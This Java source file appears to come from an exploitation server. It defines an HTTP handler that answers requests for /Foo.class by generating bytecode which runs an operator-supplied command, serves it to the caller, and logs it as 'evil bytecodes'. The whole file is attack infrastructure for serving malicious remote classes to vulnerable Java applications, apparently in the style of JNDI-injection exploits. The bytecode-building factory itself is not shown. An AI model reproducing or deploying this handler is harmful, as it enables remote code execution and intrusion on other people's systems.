package server.http.handler;

import asm.ExecObjectFactory;
import asm.context.ASMContext;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import java.io.IOException;
import java.io.OutputStream;
import java.time.LocalTime;

public class ExecHandler implements HttpHandler {
    private String command;

    @Override
    public void handle(HttpExchange exchange) throws IOException {
        String method = exchange.getRequestMethod();
        System.out.printf("[HTTP] %s %s - /Foo.class\n", LocalTime.now().toString(), method);

        byte[] bytes = new ASMContext(new ExecObjectFactory(this.command)).executeOF();
        System.out.printf("[HTTP] compiled evil bytecodes Foo.class >> execute command [%s]\n", this.command);
        exchange.sendResponseHeaders(200, 0);
        OutputStream out = exchange.getResponseBody();
        out.write(bytes);
        out.flush();
        out.close();
    }

    public HttpHandler acceptCmd(String command) {
        this.command = command;
        return this;
    }
}
